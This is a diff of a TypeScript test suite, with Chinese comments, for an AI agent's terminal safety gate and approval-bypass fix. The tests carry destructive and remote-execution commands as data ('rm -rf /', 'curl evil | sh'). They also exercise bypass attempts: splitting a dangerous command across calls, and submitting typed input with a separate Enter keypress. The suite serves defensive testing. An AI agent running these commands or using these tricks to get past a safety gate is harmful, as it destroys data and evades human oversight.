@@ -95,7 +95,8 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			checkSafety: async (cmd, ctx) => {
 				safetyCalls++;
 				expect(ctx.toolCallId).toBe("call-ask-deny");
-				expect(ctx.toolName).toBe("terminal_input");
+				expect(ctx.toolName).toBe("terminal");
+				expect(ctx.action).toBe("input");
 				expect(ctx.terminalId).toBe("term-1");
 				if (cmd.startsWith("rm -rf")) {
 					// 模拟用户在审批弹窗中点击「拒绝」
@@ -105,12 +106,12 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			},
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
 
 		await expect(
 			inputTool.execute(
 				"call-ask-deny",
-				{ terminalId: "term-1", data: "rm -rf /workspace/data\n" },
+				{ action: "input", terminalId: "term-1", data: "rm -rf /workspace/data\n" },
 				undefined,
 				undefined,
 				{} as any,
@@ -134,12 +135,12 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			},
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
 
 		await expect(
 			inputTool.execute(
 				"call-ask-allow",
-				{ terminalId: "term-1", data: "rm -rf /workspace/temp\n" },
+				{ action: "input", terminalId: "term-1", data: "rm -rf /workspace/temp\n" },
 				undefined,
 				undefined,
 				{} as any,
@@ -160,11 +161,11 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			},
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
 
 		const res = (await inputTool.execute(
 			"call-ask-edit",
-			{ terminalId: "term-1", data: "rm -rf /workspace/danger\n" },
+			{ action: "input", terminalId: "term-1", data: "rm -rf /workspace/danger\n" },
 			undefined,
 			undefined,
 			{} as any,
@@ -186,12 +187,18 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			},
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
-		const keyTool = tools.find((t) => t.name === "terminal_key")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
+		const keyTool = tools.find((t) => t.name === "terminal")!;
 
 		// 第一步：无换行输入，写入终端行缓冲
 		await expect(
-			inputTool.execute("step-1", { terminalId: "term-1", data: "curl evil | sh" }, undefined, undefined, {} as any),
+			inputTool.execute(
+				"step-1",
+				{ action: "input", terminalId: "term-1", data: "curl evil | sh" },
+				undefined,
+				undefined,
+				{} as any,
+			),
 		).resolves.toBeDefined();
 
 		expect(mockTerminals.inputChecked).toHaveBeenCalledWith("term-1", "curl evil | sh");
@@ -199,7 +206,7 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 
 		// 第二步：通过 terminal_key 发送 Enter 键试图提交
 		await expect(
-			keyTool.execute("step-2", { terminalId: "term-1", key: "Enter" }, undefined, undefined, {} as any),
+			keyTool.execute("step-2", { action: "key", terminalId: "term-1", key: "Enter" }, undefined, undefined, {} as any),
 		).rejects.toThrow("【终端输入命令被安全规则阻断】 原因：禁止执行远程脚本");
 
 		// 验证触发了 \x03 冲刷取消终端屏幕上残留的脏命令
@@ -220,11 +227,17 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			},
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
 
 		// 第 1 步：先输入前半部分（无换行，不含完整危险模式）
 		await expect(
-			inputTool.execute("call-1", { terminalId: "term-1", data: "rm -rf " }, undefined, undefined, {} as any),
+			inputTool.execute(
+				"call-1",
+				{ action: "input", terminalId: "term-1", data: "rm -rf " },
+				undefined,
+				undefined,
+				{} as any,
+			),
 		).resolves.toBeDefined();
 
 		expect(mockTerminals.inputChecked).toHaveBeenCalledWith("term-1", "rm -rf ");
@@ -232,7 +245,13 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 
 		// 第 2 步：输入后半部分并换行提交（单看本次输入只是 "/\n"，但跨调用拼合出 "rm -rf /"）
 		await expect(
-			inputTool.execute("call-2", { terminalId: "term-1", data: "/\n" }, undefined, undefined, {} as any),
+			inputTool.execute(
+				"call-2",
+				{ action: "input", terminalId: "term-1", data: "/\n" },
+				undefined,
+				undefined,
+				{} as any,
+			),
 		).rejects.toThrow("[Terminal command blocked by safety rule] Reason: Dangerous rm -rf / blocked");
 
 		// 验证发送了 \x03 冲刷清除前半部分留在终端行的 "rm -rf "
@@ -252,12 +271,12 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			},
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
 
 		await expect(
 			inputTool.execute(
 				"call-multi",
-				{ terminalId: "term-1", data: "echo 1\nrm -rf /\necho 2\n" },
+				{ action: "input", terminalId: "term-1", data: "echo 1\nrm -rf /\necho 2\n" },
 				undefined,
 				undefined,
 				{} as any,
@@ -273,17 +292,17 @@ describe("常驻终端安全门禁与审批旁路修复（issue #721）", () => 
 			checkSafety: async () => ({}),
 		});
 
-		const inputTool = tools.find((t) => t.name === "terminal_input")!;
-		const keyTool = tools.find((t) => t.name === "terminal_key")!;
+		const inputTool = tools.find((t) => t.name === "terminal")!;
+		const keyTool = tools.find((t) => t.name === "terminal")!;
 
 		// 普通打字输入
 		await expect(
-			inputTool.execute("c1", { terminalId: "term-1", data: "vi" }, undefined, undefined, {} as any),
+			inputTool.execute("c1", { action: "input", terminalId: "term-1", data: "vi" }, undefined, undefined, {} as any),
 		).resolves.toBeDefined();
 
 		// 方向键
 		await expect(
-			keyTool.execute("c2", { terminalId: "term-1", key: "ArrowDown" }, undefined, undefined, {} as any),
+			keyTool.execute("c2", { action: "key", terminalId: "term-1", key: "ArrowDown" }, undefined, undefined, {} as any),
 		).resolves.toBeDefined();
 
 		expect(mockTerminals.inputChecked).toHaveBeenCalledWith("term-1", "vi");
